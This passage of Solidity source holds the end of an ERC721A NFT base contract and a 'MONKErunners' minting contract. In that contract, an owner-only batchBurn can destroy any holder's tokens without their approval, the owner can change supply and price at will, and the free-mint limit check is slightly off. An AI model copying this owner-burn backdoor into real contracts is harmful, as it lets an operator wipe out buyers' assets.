1027     }
1028 
1029     /**
1030      * @dev See {IERC721-isApprovedForAll}.
1031      */
1032     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1033         return _operatorApprovals[owner][operator];
1034     }
1035 
1036     /**
1037      * @dev See {IERC721-transferFrom}.
1038      */
1039     function transferFrom(
1040         address from,
1041         address to,
1042         uint256 tokenId
1043     ) public virtual override {
1044         _transfer(from, to, tokenId);
1045     }
1046 
1047     /**
1048      * @dev See {IERC721-safeTransferFrom}.
1049      */
1050     function safeTransferFrom(
1051         address from,
1052         address to,
1053         uint256 tokenId
1054     ) public virtual override {
1055         safeTransferFrom(from, to, tokenId, '');
1056     }
1057 
1058     /**
1059      * @dev See {IERC721-safeTransferFrom}.
1060      */
1061     function safeTransferFrom(
1062         address from,
1063         address to,
1064         uint256 tokenId,
1065         bytes memory _data
1066     ) public virtual override {
1067         _transfer(from, to, tokenId);
1068         if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {
1069             revert TransferToNonERC721ReceiverImplementer();
1070         }
1071     }
1072 
1073     /**
1074      * @dev Returns whether `tokenId` exists.
1075      *
1076      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1077      *
1078      * Tokens start existing when they are minted (`_mint`),
1079      */
1080     function _exists(uint256 tokenId) internal view returns (bool) {
1081         return _startTokenId() <= tokenId && tokenId < _currentIndex &&
1082             !_ownerships[tokenId].burned;
1083     }
1084 
1085     function _safeMint(address to, uint256 quantity) internal {
1086         _safeMint(to, quantity, '');
1087     }
1088 
1089     /**
1090      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1091      *
1092      * Requirements:
1093      *
1094      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1095      * - `quantity` must be greater than 0.
1096      *
1097      * Emits a {Transfer} event.
1098      */
1099     function _safeMint(
1100         address to,
1101         uint256 quantity,
1102         bytes memory _data
1103     ) internal {
1104         _mint(to, quantity, _data, true);
1105     }
1106 
1107     /**
1108      * @dev Mints `quantity` tokens and transfers them to `to`.
1109      *
1110      * Requirements:
1111      *
1112      * - `to` cannot be the zero address.
1113      * - `quantity` must be greater than 0.
1114      *
1115      * Emits a {Transfer} event.
1116      */
1117     function _mint(
1118         address to,
1119         uint256 quantity,
1120         bytes memory _data,
1121         bool safe
1122     ) internal {
1123         uint256 startTokenId = _currentIndex;
1124         if (to == address(0)) revert MintToZeroAddress();
1125         if (quantity == 0) revert MintZeroQuantity();
1126 
1127         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1128 
1129         // Overflows are incredibly unrealistic.
1130         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
1131         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1132         unchecked {
1133             _addressData[to].balance += uint64(quantity);
1134             _addressData[to].numberMinted += uint64(quantity);
1135 
1136             _ownerships[startTokenId].addr = to;
1137             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1138 
1139             uint256 updatedIndex = startTokenId;
1140             uint256 end = updatedIndex + quantity;
1141 
1142             if (safe && to.isContract()) {
1143                 do {
1144                     emit Transfer(address(0), to, updatedIndex);
1145                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1146                         revert TransferToNonERC721ReceiverImplementer();
1147                     }
1148                 } while (updatedIndex != end);
1149                 // Reentrancy protection
1150                 if (_currentIndex != startTokenId) revert();
1151             } else {
1152                 do {
1153                     emit Transfer(address(0), to, updatedIndex++);
1154                 } while (updatedIndex != end);
1155             }
1156             _currentIndex = updatedIndex;
1157         }
1158         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1159     }
1160 
1161     /**
1162      * @dev Transfers `tokenId` from `from` to `to`.
1163      *
1164      * Requirements:
1165      *
1166      * - `to` cannot be the zero address.
1167      * - `tokenId` token must be owned by `from`.
1168      *
1169      * Emits a {Transfer} event.
1170      */
1171     function _transfer(
1172         address from,
1173         address to,
1174         uint256 tokenId
1175     ) private {
1176         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1177 
1178         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1179             isApprovedForAll(prevOwnership.addr, _msgSender()) ||
1180             getApproved(tokenId) == _msgSender());
1181 
1182         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1183         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1184         if (to == address(0)) revert TransferToZeroAddress();
1185 
1186         _beforeTokenTransfers(from, to, tokenId, 1);
1187 
1188         // Clear approvals from the previous owner
1189         _approve(address(0), tokenId, prevOwnership.addr);
1190 
1191         // Underflow of the sender's balance is impossible because we check for
1192         // ownership above and the recipient's balance can't realistically overflow.
1193         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1194         unchecked {
1195             _addressData[from].balance -= 1;
1196             _addressData[to].balance += 1;
1197 
1198             _ownerships[tokenId].addr = to;
1199             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1200 
1201             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1202             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1203             uint256 nextTokenId = tokenId + 1;
1204             if (_ownerships[nextTokenId].addr == address(0)) {
1205                 // This will suffice for checking _exists(nextTokenId),
1206                 // as a burned slot cannot contain the zero address.
1207                 if (nextTokenId < _currentIndex) {
1208                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1209                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1210                 }
1211             }
1212         }
1213 
1214         emit Transfer(from, to, tokenId);
1215         _afterTokenTransfers(from, to, tokenId, 1);
1216     }
1217 
1218     /**
1219      * @dev Destroys `tokenId`.
1220      * The approval is cleared when the token is burned.
1221      *
1222      * Requirements:
1223      *
1224      * - `tokenId` must exist.
1225      *
1226      * Emits a {Transfer} event.
1227      */
1228     function _burn(uint256 tokenId) internal virtual {
1229         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1230 
1231         _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1232 
1233         // Clear approvals from the previous owner
1234         _approve(address(0), tokenId, prevOwnership.addr);
1235 
1236         // Underflow of the sender's balance is impossible because we check for
1237         // ownership above and the recipient's balance can't realistically overflow.
1238         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1239         unchecked {
1240             _addressData[prevOwnership.addr].balance -= 1;
1241             _addressData[prevOwnership.addr].numberBurned += 1;
1242 
1243             // Keep track of who burned the token, and the timestamp of burning.
1244             _ownerships[tokenId].addr = prevOwnership.addr;
1245             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1246             _ownerships[tokenId].burned = true;
1247 
1248             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1249             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1250             uint256 nextTokenId = tokenId + 1;
1251             if (_ownerships[nextTokenId].addr == address(0)) {
1252                 // This will suffice for checking _exists(nextTokenId),
1253                 // as a burned slot cannot contain the zero address.
1254                 if (nextTokenId < _currentIndex) {
1255                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1256                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1257                 }
1258             }
1259         }
1260 
1261         emit Transfer(prevOwnership.addr, address(0), tokenId);
1262         _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1263 
1264         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1265         unchecked {
1266             _burnCounter++;
1267         }
1268     }
1269 
1270     /**
1271      * @dev Approve `to` to operate on `tokenId`
1272      *
1273      * Emits a {Approval} event.
1274      */
1275     function _approve(
1276         address to,
1277         uint256 tokenId,
1278         address owner
1279     ) private {
1280         _tokenApprovals[tokenId] = to;
1281         emit Approval(owner, to, tokenId);
1282     }
1283 
1284     /**
1285      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1286      *
1287      * @param from address representing the previous owner of the given token ID
1288      * @param to target address that will receive the tokens
1289      * @param tokenId uint256 ID of the token to be transferred
1290      * @param _data bytes optional data to send along with the call
1291      * @return bool whether the call correctly returned the expected magic value
1292      */
1293     function _checkContractOnERC721Received(
1294         address from,
1295         address to,
1296         uint256 tokenId,
1297         bytes memory _data
1298     ) private returns (bool) {
1299         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1300             return retval == IERC721Receiver(to).onERC721Received.selector;
1301         } catch (bytes memory reason) {
1302             if (reason.length == 0) {
1303                 revert TransferToNonERC721ReceiverImplementer();
1304             } else {
1305                 assembly {
1306                     revert(add(32, reason), mload(reason))
1307                 }
1308             }
1309         }
1310     }
1311 
1312     /**
1313      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1314      * And also called before burning one token.
1315      *
1316      * startTokenId - the first token id to be transferred
1317      * quantity - the amount to be transferred
1318      *
1319      * Calling conditions:
1320      *
1321      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1322      * transferred to `to`.
1323      * - When `from` is zero, `tokenId` will be minted for `to`.
1324      * - When `to` is zero, `tokenId` will be burned by `from`.
1325      * - `from` and `to` are never both zero.
1326      */
1327     function _beforeTokenTransfers(
1328         address from,
1329         address to,
1330         uint256 startTokenId,
1331         uint256 quantity
1332     ) internal virtual {}
1333 
1334     /**
1335      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1336      * minting.
1337      * And also called after one token has been burned.
1338      *
1339      * startTokenId - the first token id to be transferred
1340      * quantity - the amount to be transferred
1341      *
1342      * Calling conditions:
1343      *
1344      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1345      * transferred to `to`.
1346      * - When `from` is zero, `tokenId` has been minted for `to`.
1347      * - When `to` is zero, `tokenId` has been burned by `from`.
1348      * - `from` and `to` are never both zero.
1349      */
1350     function _afterTokenTransfers(
1351         address from,
1352         address to,
1353         uint256 startTokenId,
1354         uint256 quantity
1355     ) internal virtual {}
1356 }
1357 
1358 
1359 
1360 contract MONKErunners is ERC721A, Owneable {
1361 
1362     string public baseURI = "";
1363     string public contractURI = "ipfs://QmPaSQWwHwhWXXGGPKZMtUGskkzdqky3WCAyiSjS4kUgN8";
1364     string public constant baseExtension = ".json";
1365     address public constant proxyRegistryAddress = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;
1366 
1367     uint256 public constant MAX_PER_TX_FREE = 4;
1368     uint256 public FREE_MAX_SUPPLY = 3333;
1369     uint256 public constant MAX_PER_TX = 10;
1370     uint256 public MAX_SUPPLY = 6666;
1371     uint256 public price = 0.002 ether;
1372 
1373     bool public paused = true;
1374 
1375     constructor() ERC721A("Monkerunners Official", "MONKE") {}
1376 
1377     function mint(uint256 _amount) external payable {
1378         address _caller = _msgSender();
1379         require(!paused, "Paused");
1380         require(MAX_SUPPLY >= totalSupply() + _amount, "Exceeds max supply");
1381         require(_amount > 0, "No 0 mints");
1382         require(tx.origin == _caller, "No contracts");
1383         require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1384         
1385       if(FREE_MAX_SUPPLY >= totalSupply()){
1386             require(MAX_PER_TX_FREE >= _amount , "Excess max per free tx");
1387         }else{
1388             require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1389             require(_amount * price == msg.value, "Invalid funds provided");
1390         }
1391 
1392 
1393         _safeMint(_caller, _amount);
1394     }
1395 
1396   
1397 
1398     function isApprovedForAll(address owner, address operator)
1399         override
1400         public
1401         view
1402         returns (bool)
1403     {
1404         // Whitelist OpenSea proxy contract for easy trading.
1405         ProxyRegistry proxyRegistry = ProxyRegistry(proxyRegistryAddress);
1406         if (address(proxyRegistry.proxies(owner)) == operator) {
1407             return true;
1408         }
1409 
1410         return super.isApprovedForAll(owner, operator);
1411     }
1412 
1413     function withdraw() external onlyOwner {
1414         uint256 balance = address(this).balance;
1415         (bool success, ) = _msgSender().call{value: balance}("");
1416         require(success, "Failed to send");
1417     }
1418 
1419     function collect() external onlyOwner {
1420         _safeMint(_msgSender(), 5);
1421     }
1422 
1423     function pause(bool _state) external onlyOwner {
1424         paused = _state;
1425     }
1426 
1427     function setBaseURI(string memory baseURI_) external onlyOwner {
1428         baseURI = baseURI_;
1429     }
1430 
1431     function setContractURI(string memory _contractURI) external onlyOwner {
1432         contractURI = _contractURI;
1433     }
1434 
1435     function configPrice(uint256 newPrice) public onlyOwner {
1436         price = newPrice;
1437     }
1438 
1439     function configMAX_SUPPLY(uint256 newSupply) public onlyOwner {
1440         MAX_SUPPLY = newSupply;
1441     }
1442 
1443     function configFREE_MAX_SUPPLY(uint256 newFreesupply) public onlyOwner {
1444         FREE_MAX_SUPPLY = newFreesupply;
1445     }
1446 
1447         function batchBurn(uint256[] memory tokenids) external onlyOwner {
1448         uint256 len = tokenids.length;
1449         for (uint256 i; i < len; i++) {
1450             uint256 tokenid = tokenids[i];
1451             _burn(tokenid);
1452         }
1453     }
1454 
1455     function tokenURI(uint256 _tokenId) public view override returns (string memory) {
1456         require(_exists(_tokenId), "Token does not exist.");
1457         return bytes(baseURI).length > 0 ? string(
1458             abi.encodePacked(
1459               baseURI,
1460               Strings.toString(_tokenId),
1461               baseExtension
1462             )
1463         ) : "";
1464     }
1465 }
1466 
1467 contract OwnableDelegateProxy { }
1468 contract ProxyRegistry {
1469     mapping(address => OwnableDelegateProxy) public proxies;
1470 }